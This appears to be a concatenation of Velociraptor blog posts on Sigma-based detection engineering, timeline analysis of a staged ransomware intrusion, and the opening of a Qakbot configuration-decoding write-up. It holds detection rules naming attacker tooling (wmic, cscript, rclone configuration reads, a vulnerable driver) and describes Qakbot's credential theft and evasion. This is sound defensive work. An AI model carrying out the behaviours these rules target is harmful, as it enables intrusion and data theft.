would not use hashes directly in a Sigma rule. Instead [the following
rule](https://github.com/SigmaHQ/sigma/blob/6412c1a02bb60e631c6d341f6fc41d6f3c507f98/rules/windows/driver_load/driver_load_win_vuln_hevd_driver.yml)
may be used:

```yaml
title: Vulnerable HackSys Extreme Vulnerable Driver Load
author: Nasreddine Bencherchali (Nextron Systems)
logsource:
    product: windows
    category: driver_load
detection:
    selection_name:
        ImageLoaded|endswith: '\HEVD.sys'
    selection_sysmon:
        Hashes|contains:
        - 'IMPHASH=f26d0b110873a1c7d8c4f08fbeab89c5' # Version 3.0
        - 'IMPHASH=c46ea2e651fd5f7f716c8867c6d13594' # Version 3.0
    selection_other:
        Imphash:
        - 'f26d0b110873a1c7d8c4f08fbeab89c5' # Version 3.0
        - 'c46ea2e651fd5f7f716c8867c6d13594' # Version 3.0
    condition: 1 of selection*
```

This rule uses the `ImpHash` which is a hash of the import table of
the executable. Since the import table **is** covered within the
authenticode hash it is not possible to modify the binary in such a
way that its digital signature remains valid while the `ImpHash`
changes.

{{% notice note "Sysmon Hash Reporting" %}}

Sadly Sysmon currently does not report the **Authenticode Hash** of
the binary which would be ideal as it can not be changed without
invalidating the signature and covers all the important parts of the
executable file. Currently Sysmon only reports file hashes (which are
easily changed) and `ImpHash` which can be easily changed as well
but will invalidate signature.

{{% /notice %}}

## Sigma shortcomings

While Sigma rules are supposed to be directly usable between detection
stacks, by simply changing the compiler backend. However this is rarely the
case.  Because the Sigma standard is not well specified and lacks a
common taxonomy it is difficult to use a rule designed to operate on
the output of Sysmon event logs with a detection stack that only uses
System logs or EDR logs.

For example, in the above example rule, we see that the rule requires
the `Channel` to match `Security` and the `EventID` to match `4688` -
clearly this rule can only apply on the security event log
source. Replacing the log source with Sysmon provided events (which do
technically provide the `process_creation` log source) will simply
never fire this rule!

{{% notice note "Sanitizing Sigma Rules" %}}

Because the `logsource` section of the Sigma specification is not
really specific enough, most rules have a further `detection` clause
to better define the precise log source. Although technically it is
not always accurate to use that clause instead of the `logsource`
because the clause can be use in an arbitrary logical context, most of
the time it is a filter so can be taken as a substitute for the real
log source.

{{% /notice %}}

The `logsource` section is simply redundant at best and misleading at
worst; a user can assume the rule will detect an attack when Sysmon
logs are available but this is simply not the case. It would be better
if Sigma rules were less ambiguous and simply contained precise log
source information.

There is also little error checking due to a lack of precise
taxonomy. A sigma rule can specify an unknown field that is simply not
present in the event but there is no way to know that the rule will
fail to match. Apart from the obvious problem of a rule specifying a
mis-typed field, the field may not be collected at all from the
endpoint.

The example above uses the `CommandLine` field of the System event
4688, however this is not always present! According to the [Microsoft
Documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing)
this field is only present sometimes:

>> In order to see the additions to event ID 4688, you must enable the
new policy setting: Include command line in process creation events.

Without knowledge of the endpoint policy in the specific deployment it
is impossible to know if this rule will ever fire.

The following example rule is invalid and exists within [the official
Sigma repository](https://github.com/SigmaHQ/sigma/blob/6412c1a02bb60e631c6d341f6fc41d6f3c507f98/rules/windows/create_remote_thread/create_remote_thread_win_susp_uncommon_source_image.yml):

```
title: Remote Thread Creation By Uncommon Source Image
logsource:
    product: windows
    category: create_remote_thread
detection:
    create_remote_thread:
        EventID: 8
        Channel: Microsoft-Windows-Sysmon/Operational
    selection:
        SourceImage|endswith:
            - \bash.exe
            - \cscript.exe
            ...
            - \wmic.exe
            - \wscript.exe
    filter_main_winlogon_1:
        SourceImage: C:\Windows\System32\winlogon.exe
        TargetImage:
            - C:\Windows\System32\services.exe
            - C:\Windows\System32\wininit.exe
            - C:\Windows\System32\csrss.exe
    filter_main_winlogon_2:
        SourceImage: C:\Windows\System32\winlogon.exe
        TargetParentImage: System
        TargetParentProcessId: 4
        ...
    condition: create_remote_thread and (selection and not 1 of filter_main_* and
        not 1 of filter_optional_*)
```

At first sight this looks like a good rule - It targets Sysmon process
execution logs (EventID 8) using a channel detection section (the
`logsource` section is as usual meaningless and should be
ignored). However on very close examination we can see this rule
references the fields `TargetParentProcessId` and
`TargetParentImage`. Consulting the [Sysmon
Documentation](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-8-createremotethread)
we can see that there is no such field in the Sysmon output. Therefore
this rule will generally not work for standard Sysmon installs.

## On-endpoint detection

The previously described model relies on forwarding events from the
endpoint to a central location, where detection is actually made. This
approach is challenging in practice:

1. There is a trade-off between the volume and type of events relayed
   to the SIEM: On a typical Windows system there are hundreds of
   different event logs and event types. It is impossible to forward
   all events from the endpoint to the SIEM without increasing the
   network, storage and processing cost on the SIEM itself. A choice
   must be made of which events to forward.
2. Some of the normalization steps taken aim to reduce the total data
   transferred by removing some redundant fields from certain
   events. We have already seen before that `CommandLine` for Event ID
   4688 is an optional field which needs to be deliberately enabled in
   practice.

Detection capabilities are slowly migrating from a purely centralized
detection engine that processes forwarded events from the endpoint, to
more endpoint-focused detection capabilities where the endpoint can
autonomously enrich and respond to detection events. This allows the
endpoint to triage the events by applying detection rules on the
endpoint directly. Therefore only high value events are forwarded to
the SIEM.

## Case study: Velociraptor

Velociraptor is a powerful endpoint incident response and triaging
tool. At its core, Velociraptor uses the Velociraptor Query Languages
(VQL) to perform flexible triaging on the endpoint.

Recently, Velociraptor gained a native `sigma()` plugin, allowing the
endpoint agent to directly evaluate Sigma rules. A VQL artifact is
sent to the endpoint over the network containing several main
sections:

1. A set of `Sigma` rules to evaluate
2. A list of `logsource` queries to evaluate directly from the on disk
   event log files.
3. A mapping between Sigma rules and their corresponding event fields.

![Velociraptor Sigma Workflow](velociraptor_sigma_flow.svg)


## Velociraptor curated rules

As described previously, it is difficult to directly use `Sigma` rules
without careful verification. The [Velociraptor Sigma
Project](https://sigma.velocidex.com/) implements a Velociraptor
artifact compiler which builds a VQL Artifact with a curated and
verified set of rules.

The compiler verifies the following things

1. Many rules do not have accurate `logsource` sections but instead
   specify the event log to be read in their first detection
   clause. Therefore the compiler overrides the `logsource` with a
   more accurate source based on the `detection` clause.

2. The compiler compares the known set of event fields to the set of
   fields specified in the Sigma rule and flags any rules which refer
   to unknown fields.

3. Remove rules with non-standard or unsupported Sigma modifiers.

The Velociraptor Sigma project curates a number of rule sets from
sources such as:

* [Hayabusa](https://github.com/Yamato-Security/hayabusa-rules) is a
  project to maintain Sigma rules for on endpoint analysis. Hayabusa is
  also a standalone engine to match the Sigma rules on the endpoint's
  event logs (similar to Velociraptor's `sigma()` plugin)
* [ChainSaw](https://github.com/WithSecureLabs/chainsaw) is a
  repository of Sigma rules with more of a focus on Linux systems.
* [SigmaHQ](https://github.com/SigmaHQ/sigma/) is the official rule
  repository of the Sigma project. These rules are cleaned up,
  corrected and included into the Hayabusa project rule sets.

## Using on-endpoint detection for Incident Response Triage

Traditional SIEM based detection has to balance a number of tradeoffs
like volume of logs collected, and number of false positives to reduce
SIEM analyst's churn.

However, Incident Response Triaging has a different set of
requirements. Usually the incident responder needs to understand what
happened on the system without really knowing what is normal. When
evaluating Sigma rules in the incident response context, it is ok to
have more false positives in favor of exposing more possibly
suspicious activity.

In the following example I collect the `Velociraptor Hayabusa Ruleset`
artifact from the endpoint. The ruleset is extensive and rules are
broken down by rule level and rule status. However in this case I want
to try out all the rules - including very noisy ones because I want to
get an overview of what might have happened on this endpoint.

![Collecting the sigma artifact](collecting_sigma_rules.png)

The Hayabusa ruleset is extensive and might collect many false
positives. In this case it took around 6 minutes to apply the rules on
all the event log files and returned over 60k hits from about 4200
rules.

Generally it is impractical to review every single hit, so we
typically rely on Stacking the results. Within the Velociraptor GUI I
will stack by the Rule's `Title` by clicking the sort icon at the top
of the column

![Stacking rules by title](stacking_a_column.png)

Once the column is sorted, a stacking icon will appear next to
it. Clicking on that icon will display the stacking dialog view. This
view shows the different unique values of the selected column and the
total number of items of that value. In our case it shows the total
number of times the specific rule has fired.

![Viewing the stacking stats](viewing_column_stack.png)

Clicking the icon in each row seeks the table immediately to view all
the rows with the same `Title` value. In this case I want to quickly
view the hits from the `Windows Defender Threat Detected` rule.

![Viewing common rows](viewing_common_rows.png)

Using this technique I can quickly review the most interesting rules
and their corresponding hits directly in the GUI without needing to
recalculate anything. I can see what type of potentially suspicious
activity has taken place on the endpoint and identify outliers
quickly - despite the high false positive rate.


## Extending the capabilities of Sigma rules

The previous section demonstrated how Sigma can be used for rapid
triaging - The workflow is simple and effective, simply match a large
number of rules against the on-host event log files to quickly
identify and classify suspicious behavior.

This works much better than running the Sigma rules at the SIEM
because the SIEM does not receive all the events on the
endpoint. Having the ability to view more event sources can improve
our detection ability without concern for scalability of the SIEM or
increasing the amount of uploaded event traffic between the endpoint
and the detection platform.

But can we go further? Why stop at event logs at all? Being on the
endpoint directly actually provides access to a whole class of new data
sources which are far beyond the simple event logs collected by the
system. For example, we can directly examine registry keys, search for
and parse files on the endpoint and much more.

Consider the [following Velociraptor Sigma
rule](https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules/vql/rclone.yml):

```yaml
title: Rclone
logsource:
    category: vql
    product: windows

detection:
    selection:
      "EventData|vql":
          x=>x.Files OR x.Registry

    condition: selection

vql: |
  x=>dict(EventData=dict(
    Files={
      SELECT OSPath, Size, read_file(filename=OSPath, length=100) AS Data
      FROM glob(globs=Path, accessor="auto")
    },
    Registry=to_dict(item={
      SELECT Name AS _key, Data.value AS _value
      FROM glob(globs=Key, accessor="registry")
    })))

vql_args:
    Path: C:\Users\*\AppData\Roaming\rclone\rclone.conf
    Key: HKEY_USERS\*\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store\*rclone*
```

This rule uses the special `logsource` of type `vql` which allows the
event to be generated by running arbitrary VQL queries. In this case
the query looks at both the presence of a registry key **or** the
presence of a configuration file on the endpoint. If either of these
artifacts exist, the rule matches. Note that this rule goes above and
beyond event logs to directly look at system configuration.

Velociraptor has traditionally been used to collect forensic artifacts
for manual inspection. The ability to write detection rules against
forensic artifacts allows us to quickly triage the endpoint without
manually reviewing the forensic artifacts.

- Forensic artifacts paint the picture of **what happened on the
  endpoint** in as much detail as possible.
- Sigma rules quickly flag the obvious things on the endpoint **which
  are known to be bad**.

Therefore Forensic Sigma rules help to rapidly triage forensic
findings, they do not replace those but work in tandem with the
collection and analysis of forensic artifacts.


## Real Time Sigma alerting

Velociraptor's VQL language is fully asynchronous and can watch for
changes on the endpoint in real time. In Velociraptor's terminology we
can write [Event Monitoring Queries]({{% ref "/docs/clients/monitoring/" %}}).

Rather than parsing event log files as log sources for Sigma rule
matching, we can tweak the VQL slightly to feed real time events into
the Sigma rule matching. This allows us to apply Sigma rules on log
sources in real time - in effect creating real time detection rules.

The `Velociraptor Hayabusa Live Detection` option in the Curated
import artifact will import an event monitoring version of the same
curated Sigma rules. I can configure the artifact in the usual way.

![Configuring the Monitoring Sigma detection artifact](configuring_monitoring.png)

This time the endpoint will forward detection events to the server in
real time.

![Live detection of Sigma rules](live_sigma_detection.png)

In the above I can see immediately suspicious use of `PSExec` in real
time!


## Conclusions

This blog post explores the discipline of `Detection
Engineering`. Although this is not a new idea - people have been
refining and analysing detection rules since intrusion detection
systems were invented. By treating detection engineering as an art and
a science and dedicating specialist roles to it within an
organization, we can encourage and support this important role.

Detection Engineering is about maximizing detection efficacy given the
limitations of existing detection systems. We discussed the common
event collection feeding into a central SIEM architecture and how to
write detection rules for this architecture.

The Sigma rule format was designed to abstract the specifics of the
detection stack by presenting an abstract rule language. The hope was
that rules can be easily interchanged between different detection
stacks and so could be easily shared within the detection community.

However in practice the lack of rigor and well defined taxonomy in
Sigma makes porting rules between detection stacks error prone and
manual. Detection Engineers need to scrutinize rules to determine if
they are likely to work within their own environment. We discuss some
of the pitfalls to watch for when scrutinizing Sigma rules. We also
discussed how detection engineers can assess if a Sigma rule is
fragile and how it can be strengthened by utilizing more detailed log
sources.

Next we explored how Sigma rules can be applied on the endpoint itself
to access more log sources than are typically shipped to the SIEM. By
evaluating the rules directly on the endpoint, it is possible to use
Sigma rules for incident response triage purposes. I then demonstrate
the process of triage via Sigma rules using Velociraptor's built in
Sigma support and the Hayabusa ruleset by using stacking to rapidly
zero in on the suspicious activity.

How can we further improve detection efficacy? Why restrict ourselves
to event logs? Velociraptor's Sigma engine can use arbitrary VQL to
generate events from sources like registry keys, paths and many other
forensic artifacts. This allows detection rules to have unprecedented
reach.

Finally we looked at utilizing Sigma rules with real time event queries
allowing Velociraptor to alert in real time when Sigma rules match,
instead of having to post process events from the event log file.

If you like to try Sigma in Velociraptor, take [Velociraptor for a
spin](https://github.com/Velocidex/velociraptor)!  It is available on
GitHub under an open source license. As always please file issues on
the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

---END OF FILE---

======
FILE: /content/blog/2024/2024-09-12-timelines/_index.md
======
---
title: "Timelines in Velociraptor"
description: |
   The latest Velociraptor Release features an improved
   new timeline feature. This post examines the new feature
   by using it to work through a simple response case.

tags:
 - Analysis
 - Timeline
 - Forensics

author: "Mike Cohen"
date: 2024-09-12
---

{{% notice note "New feature" %}}

This feature is available in the 0.73 release. You can
[Download it]({{% ref "/downloads/" %}}) and provide valuable feedback.

{{% /notice %}}

Digital forensics is about reconstructing what happened in the past
based on available artifacts. When applying Digital Forensics to an
incident response case, we try to follow the movements of the
adversary through the network and answer some common questions:

- What happened?
- When did it happen?
- What potential information was compromised?
- How can we harden the system to prevent this from happening again.

A very useful tool for every incident manager is to build a timeline
of relevant information. A timeline helps to communicate the sequence
of actions the adversary took. Additionally timelines help us to
identify the time period of interest to the specific case, so that we
can ignore other data that happened either before or after the
incident. In this way timelining is a useful triaging tool.

## An example timeline in an investigation.

Timelining an incident is an important part of many
investigations. Before I describe the timeline feature within
Velociraptor, it is important to understand how timelines are used
traditionally. After all, Velociraptor is simply a tool that makes the
workflow simpler, but ultimately the same general process is followed!

The simplest approach is to manually keep a spreadsheet of events and
timestamps, sorted by time. This approach does not require any
additional tools than a simple spreadsheet:

- `Analysis step`: The investigator identifies important events to
  annotate by analysing various forensic artifacts or even just
  interviewing people, looking at other sources of evidence like
  security video etc.

  The purpose of this step is to identify and isolate noteworthy
  events from the thousands of time relevant data typically
  encountered in an investigation.

- `Annotation step`: The investigator then simply writes a timestamp
  in one column, a message in the other column and any additional
  information in a third column.

  The purpose of this step is to assign semantic interpretation of
  noteworthy events to explain how they are relevant to the case.

An example of such a manual approach is

Timestamp | Message | Information|
----------|---------|------------|
2021-10-12 10:10Z | Suspect entered vehicle | source=Video surveillance, Vehicle_tag=`XYZ`, Suspect=Bob|
2021-10-12 11:05Z | Call Received | source=Call Log, Number=555-1234, Duration: 2min
2021-10-12 11:06Z | Vehicle crashed | source=Police Report, Place=I95 South, near exit 175

The above example is a typical investigation timeline:

* The timeline contains information from multiple sources. We call
  each entry in the table an `event`.
* Each source contains different types of information, but each event
  has some common fields:

  - `Timestamp`: This is when the event occurred (usually specified in a
    common timezone).
  - `Message`: A generic human readable message to explain what this
    event represents.
  - `Information`: This column contains any event specific
    information. Since this information can vary, the data is normally
    stored in the same column in some kind of structured way (e.g. a
    Key/Value format)

The above timeline helps us to explain what happened - we only see
relevant, annotated events (and a note relating these to the
case). This timeline adds support to the central theory of what
actually caused the accident - likely mobile phone use by the driver.

The important takeaways from this example are:

1. I combine events from different sources based on their timestamp.
2. Only important events to the case are annotated with a human
   readable note that relates them to the case.
3. The timeline helps support a certain theory or conclusion of what
   actually happened.

## Case study: Ransomware intrusion

To illustrate how a timeline can be used in a typical DFIR
investigation, let's consider a simple (if contrived) case study:
Ransomware deployment on an endpoint.

### Step 1: Create a global notebook

Velociraptor notebooks are interactive documents that can be shared
between a group of investigators. Each notebook consists of cells,
while cells can contain markdown text or VQL queries to evaluate.

I will start off by create a global notebook to hold the timeline.

![Creating a notebook from a template](new_notebook_timeline_1.svg)

![An empty timeline notebook](new_notebook_timeline_2.svg)

### Step 2: Collect some artifacts!

In this case I will directly collect artifacts from the endpoint in
question. I search for the hostname and select it for interactive
triage.

Usually at the start of an incident I don't really know what happened
or where to start. I like to start of with some Sigma rules as curated
by the `Windows.Hayabusa.Rules` artifact. This artifact is maintained
by the separate [Velociraptor Curated
Sigma](https://sigma.velocidex.com) site. The artifact combines many
rules from the
[Hayabusa](https://github.com/Yamato-Security/hayabusa-rules) and
Sigma projects.

Sigma rules are a good place to start as they can indicate any
suspicious activity on an endpoint. Normally Sigma rules must balance
false positives with the probability of missing a detection. However,
in the triage context, I really want to see all rules - including ones
that are noisy and produce a lot of false positives.

![Configuring the Sigma artifacts](hayabusa_parameters.svg)

Therefore in this case I will choose to evaluate **All** the rules on
the endpoint. The artifact will then evaluate all rules against each
local event log file.

This results in over 18,000 events - too many to manually review! I
will post process this collection by selecting the collection's
`Notebook` tab. This is a notebook that is created inside each
collection for post processing just that one collection results.


In this case I don't really want to review every single hit. I just
want to see what **kind** of rules matched to get an overview of what
happened. I can then drill down into each hit to identify the
important ones.

This type of processing is called `Stacking`. Velociraptor has an
inbuilt stacking feature within the GUI - it is available on any
table!

![Stacking hits by Title](hayabusa_stack_1.svg)


First I sort by one of the table columns - This will select the column
I want to stack on. In this case, I will sort by the Rule Title. Once
the table is sorted, the GUI shows the stacking button. Clicking the
stacking button shows the stacking overview for this table.

![Inspecting unique rules](hayabusa_stack_2.svg)

Stacking is a common technique to view aggregation of data quickly. I
allows us to see what **kind** of rules matches in this case, and how
many times they matched. We can then drill down on each of these
matches to see if they are relevant to the case.

In the above, I immediately see some interesting rules matched! Lets
consider the rule `Windows Defender Real-time Protection
Disabled`. This event matched twice in the logs but it is usually a
strong signal so I want to drill down on it.

If I click the Link icon in the stacking table, I will be able to
explore the specific times this rule matched.

![Specific instances when Defender was disabled](hayabusa_stack_defender_disabled.svg)


I see a match in 2023 and one in 2024. In practice a lot of false
positives will occur, or even evidence of previous compromise
unrelated to the current incident! Reviewing these events at this
stage can help to put a timeline on the incident.

For our purposes we can narrow the time of interest to shortly before
`2024-09-12` and this helps us quickly focus on events after that time
(in a real case, I will be more exhaustive in checking for possible
earliest compromise)

I will then reduce the table to all events after `2024-09-12` by
adapting the cell's VQL query. In the initial stage I will only look
at high and critical level events, and remove rules which usually
produce too many false positives.

This reduces the number of events to consider from over 18,000 to
about 100 high confidence events that I can manually review.

![Reducing data](hayabusa_reduced.svg)

### Adding to the timeline.

Velociraptor's timelines implementation streamlines and enables the
above described manual process. We still mostly follow the same
general pattern but within the GUI much of the maintainance of
timelines is made easier and reduces friction for the user.

First let's define some terms:

1. An `Event` represents something that happened at a point in
   time. All events contain the following fields:

   * A Timestamp is the time when the event occurred.
   * A Message is used to describe what the event is.
   * A Data field contains arbitrary data as key/value pairs -
     depending on where the event is coming from, this data will vary.

2. A `Timeline` is a series of `Events` with a name.

3. A `Supertimeline` is a collection of `Timelines` which allows us to
   interactively inspect all the timelines together. The GUI overlays
   all the events together into one UI and allows the user to enable
   or disable any specific timeline in order to focus on specific
   types of information.

4. An `Annotation` is a special `Timeline` within the `Supertimeline`
   that users can add specific messages to. The annotations can be
   hidden or shown as other timelines but the GUI provides a way to
   add/remove annotations by inspecting other events in other timelines.

The ultimate goal of the `Supertimeline` is to build a useful set of
`Annotations` from all the events in the different timelines so that a
report may be written from it. The annotations timeline is what we
refer to as the "investigative timeline" (Similar to the example
above).

Because the Annotations timeline is for user consumption, we only want
high value and high confidence events and not too many of them. We
don't expect hundreds or thousands of annotations! Ideally we can
export the annotations from a timeline analysis and present it as a
running commentary of what happened.

Let's add our Sigma analysis to the timeline. Within the Reduced Sigma
table, click `Add to Timeline`.

![Adding a table to a super timeline timeline](add_timeline_1.svg)

The `Add Timeline` dialog allows us to create a timeline, add it to a
supertimeline and configure how events are created from the current
table:

1. Selecting `Local Timeline` or `Global Timeline` allows me to select
   which `Supertimeline` I want to add this to. Global Timelines exist
   within the `Global Notebooks` (i.e. those created from a template
   and are visible from the notebook side bar).

   I will select the `Supertimeline` in the notebook I created
   earlier.

2. Next I will name the new `Timeline` to remind me where these events
   come from. This name will be used to remind me where the events I
   see come from. I will call this `Sigma` as this is the result of
   matching the sigma rules.

3. Before the events can be created I need to designate which is the
   Timestamp and Message column - Each event must have a `Timestamp`
   and a `Message` field, while the data field will consist of the
   rest of the event specific data.

### The timeline viewer

After the reduced Sigma timeline is added, I can see the timeline
notebook updated.

![The Supertimeline UI](timeline_sigma.svg)

Following is a description of the UI:

1. The display is divided into a `Timeline Visualizer` at the top and
   a `Time table` at the bottom.
2. The `Timeline Visualizer` itself is divided into:
   * The `time navigator` at the top showing event times in UTC. You can
     drag and zoom to change the time scales, or click on the column
     headers to change the time resolution and zoom in and out of the
     time ranges.
   * Below the `time navigator` is the `Time Group Visualizer`. This
     shows the range of each time series as a color block. This color
     is also matched with the individual events shown in the timeline
     below.
   * Each time group represents a distinct time series which can be
     enabled or disabled. Disabling a time series hides it from the
     time table below, making it easier to examine only events from
     the enabled time series.
   * The `Time Cursor` can be moved by clicking within the `time
     navigator`. This controls which events are shown in the `Time
     Table` below.
3. The `Time Table` shows events from all enabled time series that
   occur after the `Time Cursor`.
   * Each event shows the `Timestamp`, `Message` and `Notes` columns
     as an overview row.
   * Clicking on the event overview shows all fields in the event.
   * Once the event is expanded, the event toolbar allows the user to
     annotate the event.



### Annotating an Event

When an event seems important, it can be annotated. Annotating an
event will copy it into a special time series within the
`Supertimeline` called `Annotation`.

![Annotating an event](timeline_annotation.svg)

The annotation should contain an explanation as to why this event is
relevant to the case.

![The annotated event](timeline_annotation_2.svg)

The annotated event is added to a separate timeline, which may be
enabled or disabled similarly as the other time series. This allows us
to concentrate on the annotations separately from other time series.

### Adding further time series

As I collect other artifacts, I can get more information about the
case:

1. Collecting the `Windows.Sys.Users` artifact enumerates the local
   users on the system, and estimates the time that the user last
   logged into the system by reporting the Modified time on the User's
   profile registry keys and home directory modification time.

   I reduce the data to show the Home directory modification time
   (Last time the user logged into the account).

```vql
SELECT HomedirMtime, Name, Description, Data
FROM source(artifact="Windows.Sys.Users")
```

   I will use the `HomedirMtime` as the Timestamp column when adding
   this time series.

2. Collecting the `Windows.Forensics.Usn` artifact can reveal
   information about files created on the filesystem and their
   creation timestamp. This gives us an idea of what files were
   introduced into the system by the attackers.

   I reduce the data to show only created files in the time range of
   interest which have a full reconstructed path.

```vql
SELECT Timestamp, OSPath, Reason
FROM source(artifact="Windows.Forensics.Usn")
WHERE Timestamp > "2024-09-12"
  AND NOT OSPath =~ "Err"
  AND Reason =~ "CREATE"
```

3. Collecting the `Windows.Timeline.Prefetch` artifact reveals
   information about when executable files were run.

   I reduce the data to show any execution after the time of interest.

```vql
SELECT event_time, message, source
FROM source(artifact="Windows.Timeline.Prefetch")
WHERE event_time > "2024-09-12"
```

4. Collecting the `Windows.System.TaskScheduler` can reveal
   information about new scheduled tasks added to the
   system. Scheduled tasks are a common reinfection mechanism added by
   attackers. Scheduled tasks are defined in XML files in the
   `C:/Windows/System32/Tasks/` directory. We can use the modification
   time for these files to determine when they were last created or
   updated.

   I reduce the data to show any scheduled tasks with the modification
   times as the timeline's timestamp

```vql
SELECT Mtime, OSPath, Command
FROM source(artifact="Windows.System.TaskScheduler/Analysis")
WHERE Mtime > "2024-09-12"
```

![The complete timeline with annotations](supertimeline.svg)

### Exporting the annotations

Once we annotated the timeline we can export the annotations in a
table for reporting purposes. The `Timeline` notebook template
provides a second cell that when recalculated exports the `Annotation`
time series into a unique table.

![Exporting the annotations](annotations_export.svg)

I now can see what the attackers did. Once they logged in as
Administrator, they Disabled Windows Defender, Added a second admin
user account. Then they logged in as that account, created a scheduled
task for persistence, disabled the Bits client logs and then
downloaded `PsExec.exe` renamed to `foo.exe`. Finally the attackers
ran `whoami` and used ping to establish network connectivity.

### The Timeline workflow

To summarize, the general workflow is illustrated below

![The general timeline workflow](workflow.svg)

As we collect artifact from a group of hosts in a hunt, or
individually from specific clients, we post process the results in
order to identify high value events.

The aim is to reduce the total number of events that are added to the
timeline in order to make it easier to review them.

Ultimately the product of the timeline exercise is to simply obtain
the `Annotation` time series. This contains the manually reviewed and
annotated set of events to explain the progression of the incident.

## Integration with third party timelining tools

Since the timeline workflow is so central to DFIR there are a number
of popular timelining tools out there. Probably the most popular is
[Timesketch](hhttps://timesketch.org/) - a collaborative timeline
analysis tool developed by the DFIR team at Google.

Many people use Timesketch in conjunction with
[Plaso](https://github.com/log2timeline/plaso) which is a timeline
based analysis engine for forensic bulk files (e.g. event logs,
filesystem metadata etc). The two tools are usually used in a pipeline
where Plaso extracts many time related events from various triaged
artifacts, storing them in the Timesketch database. This usually
results in millions of events - for example each MFT entry contains 16
distinct timestamps, leading to 16 distinct timeline events.

In practice most of these events are not relevant and cloud the
analysis process by bombarding the user with many irrelevant
events. Users then use Timesketch itself to perform filtering and
analysis in order to remove the irrelevant data.

This "Kitchen Sink" approach means that timeline becomes the main tool
for filtering and querying large events (with many irrelevant
fields). Contrast this with Velociraptor's "targeted" approach as
descried above, where pre-filtering and data shaping/enriching occurs
**before** the data is ingested into the timeline.

We believe that Velociraptor's "targeted" approach is superior than
the "Kitchen Sink" approach, but it does require a mindset shift and
for investigators to modify their processes.

Nevertheless, Timesketch is an excellent tool with many users already
very familiar with it. Timesketch itself does not actually require
Plaso at all and can also be used in a targeted way. In fact it is
possible to feed any time series data to Timesketch.

Velociraptor supports integrating with Timesketch using the
`Server.Utils.TimesketchUpload` artifact.  This artifact uploads
Velociraptor's timelines to Timesketch using the Timesketch client
library. The artifact assumes the client library is installed and
configured on the server.

To install the Timesketch client library:
```
pip install timesketch-import-client timesketch-cli-client
```

To configure the client library to access your Timesketch instance
see instructions https://timesketch.org/guides/user/cli-client/ and
https://timesketch.org/guides/user/upload-data/

This artifact assumes that the timesketch CLI is preconfigured with
the correct credentials in the `.timesketchrc` file.

You can use this artifact to manually upload any Velociraptor timeline
data to Timeline by simply specifying the `notebook_id`, the
`supertimeline` and the `timeline` names. The Artifact will prepare
automatically create a sketch if required with the same name as the
Supertimeline, and add a timeline to it with the same name as the
timeline name provided.

### Automatic Timesketch uploads

While `Server.Utils.TimesketchUpload` allows uploading timeline to
Timesketch it requires manual intervention. This makes it more complex
to use and increases friction.

We can automate timeline exports using the
`Server.Monitoring.TimesketchUpload` server monitoring artifact. This
artifact watches for any timelines added on the server and
automatically exports them to Timesketch in the background. This means
that the user does not need to think about it - all timelines created
within Velociraptor will automatically be added to Timesketch.

![Configuring the Server.Monitoring.TimesketchUpload artifact](configure_timesketch_export.svg)

To install the `Server.Monitoring.TimesketchUpload` server monitoring
artifact, select `Server Events` in the sidebar, then click the
`Update Server Monitoring Table` button. Search for
`Server.Monitoring.TimesketchUpload` and configure its parameters.

The artifact allows for finer control over which timelines to are to
be exported - For example, maybe only timelines with a name that
starts with `Timesketch` will be exported.

Finally the path on the server to the timesketch client library tool
is required - this is the external binary we call to upload the actual
data.

![Automating Timesketch Import](automating_timesketch_import.svg)

Once the server monitoring artifact is configured it simply waits
until a user adds a timeline to a Supertimeline in Velociraptor, as
described above. When that happens the timeline is automatically added
to Timesketch into a sketch named the same as the Velociraptor
Supertimeline.

![Viewing timelines in Timesketch](timesketch_view.svg)

As can be seen in the screenshot above, the same targeted timelines
are exported to Timesketch. This is most useful for existing
Timesketch users who are wish to continue using their usual timelining
tool in a more targeted way by pre-processing data in Velociraptor.

## Conclusions

Timeline analysis is an important part of many investigations. The
emerging Velociraptor built in timeline feature is a useful tool to
assist in the analysis and reporting of incident timelines.

If you like to try this new feature, take [Velociraptor for a
spin](https://github.com/Velocidex/velociraptor)!  It is available on
GitHub under an open source license. As always please file issues on
the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

---END OF FILE---

======
FILE: /content/blog/2023/2023-04-05-qakbot/_index.md
======
---
title: "Automating Qakbot decode at scale"
description: |
   This is a technical post covering practical methodology to extract
   configuration data from recent Qakbot samples.
author: "Matt Green - @mgreen27"
tags:
 - Malware
 - Detection
 - Qakbot
 - QBot
date: 2023-04-05
---

This is a technical post covering practical methodology to extract
configuration data from recent Qakbot samples. In this blog, I will
provide some background on Qakbot, then walk through decode themes in
an easy to visualize manner. I will then share a Velociraptor artifact
to detect and automate the decode process at scale.

![Qak!](images/01qak.png)

Qakbot or QBot, is a modular malware first observed in 2007 that has
been historically known as a banking Trojan. Qbot is used to steal
credentials, financial, or other endpoint data, and in recent years,
regularly a loader for other malware leading to hands on keyboard
ransomware.

Typical delivery includes malicious emails as a zipped attachment, LNK,
Javascript, Documents, or an embedded executable. The example shown in
this post was delivered by an email with an attached pdf file:

![An example Qakbot infection chain](images/02icons.png)

Qakbot has some notable defense evasion capabilities including:

1. Checking for Windows Defender sandbox and terminating on discovery.
2. Checking for the presence of running anti-virus or analysis tools,
then modifying its later stage behavior for evasion.
3. Dynamic corruption of payload on startup and rewrite on system shutdown.

Due to the commodity nature of delivery, capabilities and end game,
it is worth extracting configuration from observed samples to scope
impact from a given campaign. Hunting enterprise wide and finding a
previously missed machine or discovering an ineffective control can be
the difference in preventing a domain wide ransomware event, or a
similar really bad day.



### Configuration

Qakbot has an RC4 encoded configuration, located inside two resources
of the unpacked payload binary. The decryption process has not changed
significantly in recent times, but for some minor key changes. It uses
a SHA1 of a hard coded key that can typically be extracted as an
encoded string in the .data section of the payload binary. This key
often remains static across campaigns, which can speed up analysis with
the maintainance of a recent key list.

Current samples undergo two rounds of RC4 decryption with validation
built in. The validation bytes dropped from the data for the second
round.

After the first round:
- The first 20 bytes in hex is for validation and is compared with the
